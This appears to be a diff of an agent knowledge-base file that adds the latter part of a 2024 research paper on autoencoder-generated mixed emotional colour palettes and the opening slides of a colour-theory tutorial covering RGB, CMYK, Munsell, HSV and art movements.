+design were then developed, and in 1991,
+## (9)
+the keyword image scale and the color combination
+image  scale  were  used  to  record  more  detailed  data  on  color  combinations.  These  color
+combinations  are  represented  by  the  Munsell  notation,
+## (8)
+and  we  obtained  the  required  sRGB
+data by interpolating the renotation data (x yY values) provided by the Munsell Color Lab.
+## (17 )
+## The
+174	representative	color	images	from	the	research	were	positioned	on	   a	 scale	ranging	from	−3	   to
+-  The  horizontal  axis  (x-axis)	scale	of	   −3	to	   3	  represents	warm–cool	variations,	whereas	the
+vertical axis (y-axis)	scale	of	   −3	   to	   3	  represents	hard–soft	variations.	We	obtained	the	required
+raw data for this study by manually measuring the central coordinates of color imagery texts, as
+per original data in the aforementioned book (pp. 12 and 13).
+## 2.3    Autoencoder
+The autoencoder (AE) and generative adversarial networks (GANs) are the commonly used
+generative  models  in  deep  learning.  AE  is  typically  used  for  the  dimensionality  reduction  of
+input data and for reconstructing high-dimensional data. It consists of an encoder and a decoder,
+where  the  encoder  encodes  the  high-dimensional  input  data  into  a  low-dimensional
+representation  and  the  decoder  decodes  the  low-dimensional  representation  back  into  high-
+dimensional output data. During this process, the model learns the mapping between the input
+and the output, reducing the error between the input and the decoded data. Common applications
+of AE include image, speech, and text generation. For example, Li et al. proposed a method for
+image classification using AE in the YCbCr color space to reduce computational complexity.
+## (18)
+Hashisho et  al.  used  a  denoising  AE  with  U-Net  architecture  for  the  color  restoration  of
+
+Sensors and Materials, Vol. 36, No. 1 (2024) 139
+underwater  images,
+## (19)
+whereas  Gomes  et  al.  used  AE  for  correcting  images  under  different
+lighting conditions.
+## (20)
+GANs  are  models  composed  of  two  neural  networks:  a  generator  and  a  discriminator.  The
+generator  attempts  to  generate  data  that  is  similar  to  real  data,  whereas  the  discriminator
+attempts  to  distinguish  between  real  data  and  data  generated  by  the  generator.  These  two
+networks  compete  with  each  other  until  the  generated  data  is  indistinguishable  from  the  real
+data. GANs are commonly used for image generation, image style transfer, automatic coloring,
+and data augmentation, among other related techniques. For instance, Chen et al.
+## (21)
+proposed the
+Cartoon GAN model combined with the VGG network, which converts real photos into cartoon-
+style images.
+AE models are mostly used for image color reconstruction. We utilize the characteristics of
+AE and apply them to color generation. Instead of using traditional input data, sRGB values and
+emotional coordinates are used as input, with the goal of reconstructing data that is similar to the
+original data. By changing the emotional coordinates in the input data, a related color palette can
+be obtained.
+## 2.4    Methods
+The method for creating a mixed color image palette involves first digitizing Kobayashi’s CIS
+data. Next, AE is trained on the CIS data to reconstruct its features. Finally, the mixed CIEC and
+specified color palette are fed into the trained model for generation, resulting in a mixed color
+image palette. The next section will showcase the generated results. Kobayashi’s CIS is a scale
+that  links  image  and  color  together,  with  data  including  CIECs  and  color  palettes.  This
+configuration  is  helpful  for  systematically  implementing  color  schemes.  In  this  study,  the
+original data of CIECs and color palettes were digitized and AE was used to reconstruct CIS as
+shown  in  Fig.  3,  obtaining  data  that  is  similar  to  the  original  data  to  facilitate  subsequent
+generation.
+We modified the typical training method for AE by incorporating the color palette of CIS and
+its  corresponding  CIECs  into  the  training  samples.  The  training  samples  were  sourced  from  a
+total  of  174  color  images,  comprising  1132  color  palettes,  allowing  us  to  establish  the  data
+relationship between color images and their respective palettes, as illustrated in Fig. 4. During
+training,  we  employed  a  seven-layer  MLP  model  (11-256-256-3-256-256-11),  with  the  three
+middle  cells  representing  the  latent  variables.  The  input  and  output  layers  each  received  11
+values,  including  the  color  frequencies  of  three  sRGB  colors  for  color  imagery  and  its
+corresponding x, y  values.  In  this  study,  we  utilized  the  Adam  optimizer,  without  the  use  of
+dropout layers, and training concluded after 500000 epochs. Here,
+c
+represents the color palette
+for each color image in the original data and
+## (   )
+,xy denotes the CIEC for each color image. After
+dimensionality  reduction  by  the  encoder  and  dimensionality  restoration  by  the  decoder,  we
+obtained the reconstructed color palettes
+c'
+and
+## ()
+',   'xy. After completing AE training, during
+the  generation  of  mixed  imagery  color  palettes,  it  is  possible  to  specify  any  two-color  images.
+The  CIECs  for  different  degrees  of  imagery  variation  can  be  obtained  through  linear
+interpolation based on their respective CIECs. The number of interpolation points, N, can be set
+
+140 Sensors and Materials, Vol. 36, No. 1 (2024)
+as  needed.  The  CIEC  values  at  these  interpolation  points  can  be  used  to  generate  the  desired
+mixed imagery color palettes.
+In this study, we incorporated a specified color palette of a color image (e.g., sweet) and the
+CIEC  of  another  color  image  (e.g.,  bitter)  outside  the  specified  color  image  into  the  system
+architecture of AE. The results obtained through the linear interpolation of the CIEC were fed
+into the trained AE model. The formulas are as follows:
+Fig. 3. (Color online) Reconstructed CIS.
+Fig. 4. (Color online) Autoencoder.
+
+Sensors and Materials, Vol. 36, No. 1 (2024) 141
+
+## (   )
+## 12
+1xx  xtt=+−
+## (1)
+and
+
+## (   )
+## 12
+1, yttyy=+−
+## (2)
+with t = i / N, where N is the number of desired generated samples.
+## ()
+## 11
+,xy represents the CIEC
+of the specified color scheme sweet and
+## ()
+## 22
+,xy represents the CIEC of another specified color
+scheme  bitter.  Figure  5  illustrates  the  process  of  generating  a  mixed  emotional  color  scheme
+from  the  sweet  color  scheme  and  sweet’s  emotional  coordinates  to  bitter’s  generated  color
+scheme.  This  generation  method  allows  for  mixing  two  or  more  color  schemes  with  mixed
+emotional color schemes.
+Figure 6 shows the results of five generative color palettes by linear interpolation using the
+sweet–bitter  and  colorful–simple  and  appealing  CIECs,  along  with  the  corresponding  color
+schemes generated by combining them with the sweet and colorful color palettes, respectively.
+Fig. 5. (Color online) Generating a color palette of mixed color images.
+Fig. 6. (Color online) Generating results of mixed color images.
+
+142 Sensors and Materials, Vol. 36, No. 1 (2024)
+-   Results and Discussion
+In  this  section,  we  will  explain  the  AE  training  samples,  the  AE  training  process,  and  the
+results of the color palette generation method that we proposed. We will also assess the results
+generated through visual experiments and provide some potential applications for this method.
+Firstly,  the  AE  model,  as  mentioned  earlier,  is  a  traditional  neural  network  architecture
+composed  of  multiple  dense  layers.  The  training  data  consisted  of  1132  samples  of  CIS  color
+combinations,  originating  from  174  different  color  images.  Note  that  the  number  of  color
+combinations  per  color  image  is  not  uniform.  Each  color  image  is  associated  with  a  single
+independent x-y coordinate pair, representing the emotional tendencies of cool–warm and soft–
+hard. These color values and the CIEC x-y raw data are sourced from the original CIS book (as
+referenced). However, as the original data did not provide corresponding sRGB color values, the
+values used in this research experiment were obtained through interpolation using the Munsell
+notation provided in Kobayashi’s earlier research (as referenced). Additionally, the x-y data was
+manually measured.
+The  training  of  AE  employed  the  MSE  loss  function  and  utilized  the  Adam  optimizer  for
+estimating all weight parameters. The training process was highly stable and rapidly converged.
+By epoch=1000, the MSE had already decreased from 0.805848 to 0.014947 and continued to
+steadily  decrease.  To  achieve  the  goal  of  generating  colors  with  almost  imperceptible
+differences, the training was carried out until epoch = 500000, ultimately reducing the MSE to
+0.00000560, nearly approaching zero. Figure 7 illustrates the convergence of AE training, with
+Fig.  7(a)  representing  the  stages  from  epoch  =  1  to  epoch  =  1000,  and  Fig.  7(b)  depicting  the
+entire process from epoch = 1 to epoch = 500000.
+Subsequently,  we  conducted  a  series  of  visual  observation  assessment  experiments.  We
+selected  10  pairs  of  color  imagery  categories,  namely,  sweet–bitter,  colorful–simple  and
+appealing, old-fashioned–modern, casual–formal, showy–pure and simple, soft–sharp, happy–
+solemn, wild–urban, sweet and dreamy–practical, and mature–youthful. For each pair, 25 color
+palettes were generated (N = 25), resulting in a total of 10 color palettes. These color palettes
+were  distributed  to  60  participants  in  the  form  of  an  online  questionnaire.  Participants  were
+asked to provide their observations and perceptions regarding the degree of imagery blending
+in the generated color palettes. An example of the questionnaire is shown in Fig. 8. We set the
+order  of  color  palettes  generated  by  AE  as  the  standard  answer  and  arbitrarily  selected  three
+color  palettes,  asking  participants  to  restate  the  order  they  perceived.  Finally,  we  assessed
+whether  the  participants’  answers  matched  the  order  generated  by  AE,  and  the  results  are
+presented in Table 1. The findings indicate a positive recognition of the visual conveyance of
+the generated color palettes. The imagery presentation of our generated color palettes exhibited
+consistency  in  the  emotional  blending  degree  order  with  the  perception  of  the  majority  of
+humans in most of the tests.
+In terms of application, in this study, we incorporate the generated mixed color image palette
+results into design templates to create photo filters or frames, as shown in Fig. 9. Figures 10 and
+11 respectively show the results of applying design templates as filter effects to photos and their
+
+Sensors and Materials, Vol. 36, No. 1 (2024) 143
+Fig. 7. (Color online) Convergence process of AE training: (a) before 1000 epochs and (b) entire process.
+Fig. 8. (Color online) Sample questionnaire image.
+(a)( b)
+## Table 1
+Results of visual observation assessment experiment.
+Color image 1Color image 2Response consistency
+## 1sweetbitter0.89
+2colorfulsimple and appealing0.89
+## 3old-fashionedmodern0.75
+## 4casualformal0.22
+5showypure and simple0.67
+## 6softsharp0.60
+## 7happysolemn0.91
+## 8wildurban0.52
+9sweet and dreamypractical0.57
+## 10matureyouthful0.49
+
+14 4 Sensors and Materials, Vol. 36, No. 1 (2024)
+use as frames. With the prevalence of social media today, users commonly express their moods
+through photos. Designing filters or frames allows for more variations in photos and enhances
+the conveyance of emotions.
+Fig. 9. (Color online) Design templates of various color palette layouts for the colorful to simple generated results.
+Fig. 10. (Color online) Results of adding design frames to photos.
+Fig.	11.	  (Color	online)	Results	of	  applying	filters	to	  photos.
+
+Sensors and Materials, Vol. 36, No. 1 (2024) 145
+## 4.       Conclusion
+The image color filter method we designed offers a potential avenue for the development of
+color sensor technology. In this study, we utilized AE to generate color palettes of a mixed color
+image,  with  the  aim  of  assisting  designers  in  personalizing  their  color  schemes.  We  used  data
+from CIS and transformed it into numerical data, which was then fed into AE as training data to
+construct  a  data  mapping  relationship  between  a  color  image  and  color  palettes.  Finally,  the
+emotion  coordinates  of  the  specified  mixed  color  image  and  color  palettes  were  fed  into  the
+trained  AE  model  to  generate  customized  palettes  with  a  different  mixed  color  image.  As  a
+result,  the  application  in  conveying  emotions  in  photographs  allows  users  to  express  stronger
+feelings through color palettes that contain a different image. The effectiveness of this approach
+can be observed from the sample image mentioned above, highlighting the necessity of research
+in developing color emotional filters for photos.
+## Acknowledgments
+This  work  was  supported  by  a  project  from  the  National  Science  and  Technology  Council
+## (NSTC 112-2420-H-003-002).
+## References
+1 A. Damle and P. J. Smith: Design Stud. 30 (2009) 521. ht t ps://doi.org /10.1016/j.dest ud.2009.01.001
+2    W.  R.  Crozier:  Rev.  Prog.  Coloration  Relat.  Top.  26  (1996)  63.  ht t p s://d oi.o r g /10.1111/j.1478 - 4 4 0 8.19 96.
+t b 0 0111. x
+3 N. Kaya and H. H. Epps: College Stud. J. 38 (2004) 396. http://dx.doi.org/
+4 M. Hanada: Color Res. Appl. 43 (2018) 224. ht t ps://doi.org /10.1002/col.22171
+5 Y. Chen, J. Yang, Q. Pan, M. Vazirian, and S. Westland: Color Res. Appl. 45 (2020) 85. ht t ps://doi.org /10.1002/
+col.22434
+6  S.  Liu,  M.  Tao,  Y.  Huang,  C.  Wang,  and  C.  Li:  IEEE  Trans.  Visual  Comput.  Graphics  (2022)  1.  htt ps://doi.
+org /10.1109/TVCG.2022.3226218
+7 J. Jue and J. H. Ha: Front. Psychol. 13 (2022). https://doi.org/10.3389/fpsyg.2022.1065372
+8 S. Kobayashi: Color Res. Appl. 6 (1981) 93. ht t ps://doi.org /10.1002/col.5080060210
+9 S. Kobayashi: Color Image Scale (Kodansha, New York, 1991).
+10 J. Delon, A. Desolneux, J. L. Lisani, and A. B. Petro: IEEE Int. Conf. Image Process. 2005 2 (2005) II. htt p://
+d x.doi.org /10.1109/ ICIP.2005.1530153
+11 X. Wang, J. Jia, and L. Cai: Visual Comput. 29 (2013) 1121. ht t ps://doi.org /10.1007/s00371- 012- 0755-3
+12 S. Liu and H. Luo: Color Res. Appl. 41 (2016) 513. ht t ps://doi.org /10.1002/col.21988
+13     E.  Kim  and  H.-J.  Suk:  Proc.  24th  ACM  Int.  Conf.  Multimedia  (2016)  1316.  htt ps://doi.
+org/10.1145/2964284.2964323
+14      N.  Kita,  S.  Kawasaki  and  T.  Saito:  SIGGRAPH  Asia  2022  Posters  (2023)  Article  9.  htt ps://doi.
+org/10.1145/3550082.3564203
+15      L.  Xu,  S.  J.  Park,  and  S.  Lee:  ACM  Trans.  Comput.-Hum.  Interact.  30  (2023)  Article  51.  htt ps://doi.
+org /10.1145/3571816
+16 X. Zhang and M. Yang: Color Res. Appl. 44 (2019) 651. ht t ps://doi.org /10.1002/col.22374
+17    Munsell  Renotation  Data:  https://www.rit.edu/science/munsell-color-science-lab-educational-
+resources#munsell-renotation-data (accessed April 2022).
+18  Z.  Li,  Y.  Fan,  and  F.  Wang:  2015  8th  Int.  Congr.  Image  and  Signal  Processing  (CISP)  (2015)  351.  htt ps://doi.
+org /10.1109/CISP.2015.7407903
+19 Y. Hashisho, M. Albadawi, T. Krause, and U. F. v. Lukas: 2019 11th Int. Symp. Image and Signal Processing
+and Analysis (ISPA) (2019) 117. ht t ps://doi.org /10.1109/ ISPA.2019.8868679
+
+146 Sensors and Materials, Vol. 36, No. 1 (2024)
+20 P. R. Gomes, H. H. Sabuj, M. A. Uddin, M. T. Reza, R. I. Faiz, and M. A. Alam: 2021 Int. Conf. Electronics,
+Information, and Communication (ICEIC) (2021) 1. https://doi.org/10.1109/ICEIC51217.2021.9369779
+21 Y. Chen, Y. K. Lai, and Y. J. Liu: 2018 IEEE/CVF Conf. Computer Vision and Pattern Recognition (2018) 9465.
+ht t ps://doi.org /10.1109/CV PR.2018.00986
+About the Authors
+Tzren-Ru  Chou  received  his  B.S.  degree  in  applied  mathematics  from
+National  Chung  Hsing  University,  Taiwan  (1988),  and  his  Ph.D.  degree  in
+computer science from National Tsing Hua University, Taiwan (1995). He is an
+associate professor in the Department of Graphic Arts and Communications at
+National Taiwan Normal University. He had been a postdoctoral researcher at
+the Institute of Information Science, Academia Sinica, Taiwan, from 1995 to
+- His research interests include spectral color imaging, color emotion, and
+machine learning. (trchou@ntnu.edu.tw)
+Jie-Yun  Shao  received  her  B.S.  degree  from  National  Taitung  University,
+Taiwan, in 2021 and her M.S. degree from National Taiwan Normal University,
+Taiwan, in 2023. Her research interests are in color generation, color images,
+and so forth. (61072012H@gapps.nt nu.edu.t w)
+
+---
+> **METADATA (NEXUS SEMANTIC TAGS)**: [database, ui-ux, performance, tdd, vcs, api]
 
 ### 📘 KNOWLEDGE: NEXUS_STACK-DRILL-DOWN.MD
 
@@ -11567,6 +21549,1728 @@ Untuk memulai simulasi mandiri (Recursive Evolution), Nexus Agent harus mengikut
 
 ---
 > **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd, vcs, saas, api]
+
+### 📘 KNOWLEDGE: NEXUS_2343483.2343484.MD
+
+# Theresa Marie Rhyne
+> **VERSION**: v1 | **Last Updated**: 26/05/2026
+
+
+theresamarierhyne@gmail.com
+APPLYING COLOR THEORY
+TO DIGITAL MEDIA & VISUALIZATION
+1
+1
+• Additive and Subtractive Color Models.
+• Defining Color Gamut, Spaces and Systems.
+• Selected Artistic Movements related to Color Theory.
+• Case Studies pertaining to Colorizing Visualizations.
+• Hands on Workshop using Online Color Tools
+IN THIS TUTORIAL, WE HIGHLIGHT 5 TOPICS:
+theresamarierhyne@gmail.com
+2
+2
+```
+• Red, Green Blue (RGB) - adding colors with light as seen on our color
+```
+display monitors and with digital cameras.
+```
+• Cyan, Magenta, Yellow and Key Black (CMYK) - subtracting colors
+```
+with ink as seen from high resolution printouts and with our local
+printing devices.
+```
+• Red, Yellow and Blue (RYB) - subtracting colors with paint when we
+```
+use a real paintbrush, crayons or makers.
+FIRST, LET’S START OUR TUTORIAL WITH A REVIEW
+OF ADDITIVE AND SUBTRACTIVE COLOR MODELS:
+theresamarierhyne@gmail.com
+3
+3
+Red, Green and Blue lights showing secondary colors. Open Source Image available at WIkipedia and created by
+```
+en:User: Bb3dxv, see: http://en.wikipedia.org/wiki/File:RGB_illumination.jpg.
+```
+```
+RED, GREEN AND BLUE (RGB) - THE ADDITIVE COLOR MODEL OF
+```
+```
+LIGHTS:
+```
+theresamarierhyne@gmail.com
+4
+4
+Layers of simulated glass show how semi-transparent Cyan, Magenta and Yellow colors combine on paper. Open
+Source Image available at WIkipedia and created by Mirsad Todorovac, see: http://en.wikipedia.org/wiki/File:Color-
+subtractive-mixing-cropped.png.
+```
+CYAN, MAGENTA,YELLOW AND KEY BLACK (CMYK) - THE
+```
+SUBTRACTIVE COLOR MODEL OF PRINTING:
+theresamarierhyne@gmail.com5
+5
+Mixture of Red, Yellow and Blue primary colors used in art and design education, particularly in painting. Public Domain
+image available at WIkipedia and created cflm, see: http://en.wikipedia.org/wiki/File:Color_mixture.svg.
+```
+RED, YELLOW, AND BLUE (RYB) - THE PAINTER’S SUBTRACTIVE
+```
+COLOR MODEL:
+theresamarierhyne@gmail.com6
+6
+VISUALLY SUMMARIZING COLOR MODELS:
+RGB adds with lights.
+CMYK subtracts for printing.
+RYB subtracts to mix paints.
+theresamarierhyne@gmail.com7
+7
+```
+• Hexachrome (CMYKOG) - six color printing process once used:
+```
+Cyan, Magenta, Yellow, Key Black, Orange and Green.
+SOMETIMES OTHER COLOR MODELS ARE DEVELOPED TO
+SUPPORT SPECIFIC OUTPUT DEVICES:
+theresamarierhyne@gmail.com8
+8
+• Color Model + Color Gamut = Color Space.
+```
+• International Commission on Illumination Color Space (CIE XYZ).
+```
+• Munsell Color System.
+•Pantone Color Matching
+•Web Colors: Hex Triplets
+```
+•Hue, Saturation, Value (HSV)
+```
+• The Color Wheel and Color Schemes
+NEXT, WE DEFINE SOME COLOR TERMINOLOGY:
+theresamarierhyne@gmail.com9
+9
+COLOR GAMUT: THE SUBSET OF COLORS THAT CAN BE
+ACCURATELY REPRESENTED IN A GIVEN CIRCUMSTANCE.
+The Color Gamut of a typical computer monitor. The grayed out portion represents the entire color range
+available. Open Source Image available at WIkipedia and created by Hankwang, see: http://en.wikipedia.org/
+wiki/File:CIExy1931_srgb_gamut.png.
+theresamarierhyne@gmail.com10
+10
+COLOR MODEL + COLOR GAMUT = COLOR SPACE.
+```
+Comparison of the color spectrum (shown as the large oval in the back) with RGB color spaces. This image shows
+```
+that an Epson 2200 printer can produce colors outside sRGB and Adobe RGB color spaces. Open Source Image
+available at WIkipedia and created by Jeff Schewe, see: http://en.wikipedia.org/wiki/File:Colorspace.png.
+RGB MODEL + COLOR GAMUT = COLOR SPACE
+theresamarierhyne@gmail.com11
+11
+Comparison of the RGB and CMYK colors models. This image depicts the differences between how colors appear on a
+```
+color monitor (RGB) compared to how the colors reproduce in the CMYK print process.
+```
+Public Domain Image available at WIkipedia and created by Annette Shacklett, see: http://en.wikipedia.org/wiki/
+```
+File:RGB_and_CMYK_comparison.png.
+```
+COMPARISON OF RGB & CMYK COLOR SPACES
+theresamarierhyne@gmail.com12
+12
+SOME REAL WORLD COMPARISONS OF COLOR SPACES.
+Comparison of imagery from two color collage studies. The original collages were made by cut and pasting
+```
+colorful papers together. Later a 35mm slide was taken of the paper collage and a Cibachrome (Ilfochrome)
+```
+color print was created from the slide image. Notice the differences between the final colors of the paper
+imagery and the photograph imagery. Imagery created by Theresa-Marie Rhyne.
+```
+CIBACHROME (ILFOCHROME) PHOTOGRAPH VERSUS PAPER COLLAGE
+```
+theresamarierhyne@gmail.com13
+13
+SOME REAL WORLD COMPARISONS OF COLOR SPACES.
+Here, we show two examples that compare an original color printout of a digital image with a photograph of a
+35mm slide of the same digital image. Imagery created by Theresa-Marie Rhyne.
+COMPARISON OF COLOR PRINTOUTS AND COLOR PHOTOGRAPHS
+theresamarierhyne@gmail.com14
+14
+• “Real World Color Management, 2nd Edition” by Bruce Fraser,
+Chris Murphy and Fred Bunting
+```
+(http://www.colorremedies.com/realworldcolor/).
+```
+• “Real World Image Sharpening with Adobe Photoshop,
+Camera Raw, and Lightroom, 2nd Edition” by Bruce Fraser and
+Jeff Schewe
+```
+(http://www.adobepress.com/bookstore/product.asp?isbn=0321637550).
+```
+• Color Management Web Site:
+```
+(http://www.colormanagement.com/).
+```
+ADDITIONAL RESOURCES ON COLOR
+```
+MANAGEMENT:
+```
+theresamarierhyne@gmail.com15
+15
+The CIE XYZ color space is a based on experimental perception studies conducted by W. David Wright and John Guild
+in the 1920s. The CIE 1931 XYZ color space,shown above, is designed for matching calibrated displays or printers.
+Open Source Image available at WIkipedia and created by Paulschou, see: http://en.wikipedia.org/w/index.php?
+```
+title=File:Chromaticity_diagram_full.pdf&page=1.
+```
+CIE XYZ COLOR SPACE: FROM THE INTERNATIONAL COMMISSION
+ON ILLUMINATION
+theresamarierhyne@gmail.com16
+16
+• CIE 1931 was limited in expressing lightness, purity and dominant wavelength between colors.
+• In 1976, CIE evolved two systems to address uniform color spacing:
+CIELUV and CIELAB.
+• CIE LUV is designed as a simple to compute transformation of CIE XYZ 1931 to address
+perceptual uniformity, L, u & v are calculated from chromaticity coordinates.
+CIE LUV is well suited for computer graphics, for more mathematics details see:
+```
+Computer Graphics: Principles and Practice in C (2nd Edition)
+```
+J. Foley, A. van Dam, S. Feiner, and J. Hughes.
+```
+• With CIE LAB (CIE Lab), L = lightness coordinate, a = red/green coordinate, and b = yellow/blue
+```
+coordinate.
+For more specifics on CIE LAB, see Gernot Hoffmann’s discussion at:
+```
+http://www.fho-emden.de/~hoffmann/cielab03022003.pdf.
+```
+CIE LAB is closely related to the Munsell Color System.
+UPDATES TO CIE XYZ COLOR SPACE:
+theresamarierhyne@gmail.com
+17
+17
+• Hue: 5 principal hues of Red, Yellow,
+Green, Blue and Purple with 5
+intermediate hues halfway between
+each principal.
+Each of these 10 steps is divided into 10 sub-steps to
+yield 100 hues with integer values.
+```
+• Value: black (value 0) at the bottom to
+```
+```
+white (value 10) at the top.
+```
+• Chroma: measured radially from the
+center of each slice.
+Lower chroma value is less pure, more washed out
+like a pastel.
+MUNSELL COLOR SYSTEM:
+A HUE, VALUE AND CHROMA COLOR SPACE
+Open Source Image available at WIkipedia and created
+by Jacobolus, see: http://en.wikipedia.org/wiki/
+```
+File:Munsell-system.svg
+```
+theresamarierhyne@gmail.com18
+18
+MUNSELL COLOR SYSTEM:
+A HUE, VALUE AND CHROMA COLOR SPACE
+Open Source Image available at WIkipedia
+and created by Jacobolus, see: http://
+en.wikipedia.org/wiki/File:Munsell-
+system.svg Albert H. Munsell developed the Munsell Color System in the early 1900s. The 1929 Munsell Book of
+Color defined the fundamentals of the color space configuration shown above.
+Open Source Image available at WIkipedia and created by SharkD, see: http://
+commons.wikimedia.org/wiki/File:Munsell_1929_color_solid.png.
+theresamarierhyne@gmail.com19
+19
+• 1,114 colors specified by their allocated
+number such as “PMS 130”.
+```
+Colors based on 15 pigments (13 base color
+```
+```
+pigments along with black & white) that are mixed
+```
+in specified amounts.
+• Aids in standardizing colors in the CMYK
+color printing process.
+CMYK printing effectively reproduces a special
+subset of Pantone colors.
+• Pantone online: www.pantone.com
+• my PANTONE app : http://www.pantone.com/
+pages/pantone/pantone.aspx?pg=20696
+PANTONE COLOR MATCHING SYSTEM:
+USED FOR STANDARDIZING COLORS
+Open Source Image available at WIkipedia and created by
+Parhamr, see: http://en.wikipedia.org/wiki/
+```
+File:PantoneFormulaGuide-solidMatte-2005edition.png
+```
+theresamarierhyne@gmail.com20
+20
+• A hex triplet: the 6 digit, 3-byte hexadecimal
+number used in HTML, CSS, SVG and other web
+focused applications to represent colors.
+• A byte: a number in the range 00 to FF
+```
+(hexadecimal notation) or 0 to 255 in decimal
+```
+notation.
+• The bytes represent red, green, and blue
+components of color.
+Byte 1: red value
+Byte 2: green value
+Byte 3: blue value
+• If any one of the 3 color values is less than 10 hex
+```
+(or 16 decimal), it must be represented with a 0 so
+```
+that the triplet always has 6 digits.
+WEB COLORS: HEX TRIPLETS
+```
+Image from the World Wide Web Consortium (W3C)’s CSS Color
+```
+```
+Module Level 3 Recommendation (standard) - 07 June 2011,
+```
+```
+(http://www.w3.org/TR/css3-color/#svg-color)
+```
+```
+"Copyright © 07 June 2011 World Wide Web Consortium, (Massachusetts Institute of Technology, European
+```
+```
+Research Consortium for Informatics and Mathematics, Keio University). All Rights Reserved. http://
+```
+www.w3.org/Consortium/Legal/2002/copyright-documents-20021231"
+theresamarierhyne@gmail.com21
+21
+• HSV concepts presented by Alvy Ray Smith @
+SIGGRAPH 1978: “Color Gamut Transform Pairs”,
+```
+(http://alvyray.com/Papers/CG/color78.pdf)
+```
+• Hue: defines a particular color selection in terms of
+wavelengths dimensions.
+• Saturation: refers to the dominance of hue in a
+color, ranges from “pure” to “desaturated”.
+• Value: expressed in terms of lightness or darkness of
+a given color, overall intensity of the spectral light.
+• HSV is expressed as a 3D cone where color hue
+values are strongest at the outer edge and become
+desaturated when moving toward the central linear
+axis.
+```
+HUE, SATURATION AND VALUE (HSV):
+```
+IMPROVE RGB COLOR MODEL IN REGARD TO PERCEPTION
+Three dimensional cone representation of the Hue,
+```
+Saturation and Value (HSV) color model for color display
+```
+devices. Illustration by Theresa-Marie Rhyne, 2011.
+theresamarierhyne@gmail.com22
+Hue
+Value
+Saturation
+22
+• Primary Colors: set of colors combined to
+make a useful range of colors.
+RGB, CMY, and RYB are the most popular sets of
+primary colors.
+• Secondary Colors: produced by mixing
+primary colors.
+For RGB: Yellow, Cyan, Magenta
+For CMY: Blue, Green, Red
+For RYB: Orange, Green, Purple
+• Complementary Colors: colors opposite
+each other on the color wheel.
+THE COLOR WHEEL:
+ARRANGING COLORS HUES AROUND A CIRCLE
+Public Domain Image available at WIkipedia and created
+by J. Arthur H. Hatt for “The Colorist” in 1908. See: http://
+en.wikipedia.org/wiki/File:RGV_color_wheel_1908.png.
+theresamarierhyne@gmail.com 23
+23
+USING THE COLOR WHEEL TO BUILD COLOR SCHEMES
+• Monochromatic: Different tints or shades of
+one color.
+• Analogous: colors adjacent to each other
+on the Color Wheel.
+• Split Analogous: a main color and two
+colors one space away from it on each
+side of the Color Wheel.
+• Complementary: colors opposite each
+other on the Color Wheel.
+• Split Complementary: a main color and
+two colors on each side of its
+complementary color.
+• Triadic: 3 colors equally spaced on the
+Color Wheel.
+• Tetradic: Any 4 colors with a logical
+relationship on the Color Wheel such as
+2 complementary pairs.
+Others to be discussed in our Hands on Session.
+Public Domain Image available at WIkipedia and created by J. Arthur H. Hatt for
+“The Colorist” in 1908. See: http://en.wikipedia.org/wiki/
+```
+File:RGV_color_wheel_1908.png.
+```
+theresamarierhyne@gmail.com24
+24
+```
+• Pointillism (as well as Impressionism, Divisionism and Ben Day Dots).
+```
+• Fauvism.
+•Color Field Painting.
+• Bauhaus teachings of Color Theory.
+NOW, LET’S EXAMINE
+SELECTED ARTISTIC MOVEMENTS PERTAINING TO
+COLOR THEORY:
+theresamarierhyne@gmail.com25
+25
+• Technique of painting developed by
+George Seurat in 1886. Image on right
+is from his “La Parade de Cirque”
+painting.
+Relies on the eye and mind of the viewer to
+compose the color dots into a broader range of
+tones.
+• Pointillism is an outgrowth of the
+Impressionism art movement.
+Impressionism paintings noted for visible brush
+strokes & emphasis on light.
+• Divisionism is a variant of Pointillism that
+focuses on color theory.
+```
+POINTILLISM: BUILDING AN IMAGE FROM SEPARATE DOTS
+```
+OF PAINT
+```
+Public Domain Image available at WIkipedia (expired
+```
+```
+Copyright) , see: http://en.wikipedia.org/wiki/File:Seurat-
+```
+La_Parade_detail.jpg
+theresamarierhyne@gmail.com 26
+26
+• The CMYK printing process used by color
+printers is dot based.
+• Television and Computer Monitors use a
+pointillist method to represent image with
+the RGB color model.
+• Ben-Day Dots printing process uses
+colored dots that are widely spaced,
+closely spaced or overlapping to create
+optical illusions.
+The illustrator Benjamin Day developed the method
+that has been used in comic books. The artist, Roy
+Lichtenstein, enlarged and exaggerated the
+method.
+MANY OTHER METHODS ARE ANALOGOUS TO
+POINTILLISM
+Image created by Theresa-Marie Rhyne to study Divisionism and Ben Day dots. See: http://
+web.me.com/tmrhyne/Theresa-Marie_Rhynes_Viewpoint/Blog/Entries/
+2009/12/3_Exploring_Divisionism_in_Computer_Graphics.html.
+theresamarierhyne@gmail.com 27
+27
+•Short lived art movement from 1905 to 1907.
+Leading artists were Henri Matisse and Andre Derain.
+Image on right is Matisse’s “Woman with a Hat” oil
+painting created in 1905.
+• The grouping of artists were called “Les
+Fauves” or “ The Wild Beasts”.
+Painterly qualities of wild brush work and saturated
+color. The subject matter was simplified and
+sometimes abstract.
+```
+FAUVISM: STRONG COLOR EMPHASIZED OVER
+```
+REPRESENTATIONAL OR REALISM
+Public Domain Image in the USA available at WIkipedia
+```
+(image created before 1923) , see: http://en.wikipedia.org/
+```
+wiki/File:Matisse-Woman-with-a-Hat.jpg.
+theresamarierhyne@gmail.com 28
+28
+•Abstract Expressionism art movement
+that emerged during the 1940s and
+continued into the 1950s and 1960s.
+Leading artists were / are Kenneth Noland,
+Gene Davis, Ellsworth Kelly, Helen
+Frankenthaler, Anne Truitt, Jack Bush, and Frank
+Stella.
+Image on right is Frank Stella’s “Ragga II”
+painting created in 1970.
+• Large canvas areas of pure color that
+created areas of unbroken surface
+and a flat picture plane.
+Still an active abstract painting style today.
+COLOR FIELD PAINTING: LARGE AMOUNTS OF FLAT
+SOLID COLOR SPREAD ACROSS A CANVAS
+Fair Use Image in the USA taken by Theresa-Marie Rhyne. “Ragga
+II”painting and Copyright by Frank Stella, 1970. Dimensions: 120
+by 300 inches. In the collection of the North Carolina Museum of
+Art, see: http://collection.ncartmuseum.org/collection11/view/
+objects/asitem/People$0040185/0?
+```
+t:state:flow=57b04465-42fb-4180-ab3b-b7063019d013.
+```
+theresamarierhyne@gmail.com 29
+29
+• The Bauhaus: School in Germany with pioneering approaches to teaching
+design. School operated from 1919 to 1933. Many instructors continued
+developing their teachings after 1933.
+• Paul Klee: “The Diaries of Paul Klee 1898 - 1918”.
